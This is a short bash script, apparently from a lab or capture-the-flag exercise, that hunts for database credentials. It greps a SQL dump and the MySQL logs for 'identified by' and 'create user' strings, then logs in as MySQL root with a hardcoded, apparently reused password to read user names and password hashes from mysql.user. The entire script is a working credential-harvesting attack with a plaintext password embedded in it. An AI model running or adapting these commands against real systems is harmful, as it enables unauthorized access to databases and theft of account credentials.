#!/bin/bash
clear
echo "=1 dump grep="
grep -n -iE 'identified by|create user|grant all|db_backup' /tmp/db_dump.sql 2>/dev/null | head -12
echo "=2 mysql logs="
ls -l /var/log/mysql* 2>/dev/null | head -6
grep -rh -iE 'identified by|create user' /var/log/mysql* 2>/dev/null | head -8
echo "=3 try reused pwd="
mysql -uroot -pOaDb@Lab#7f3a -e "select user,host,password from mysql.user" 2>&1 | head -10
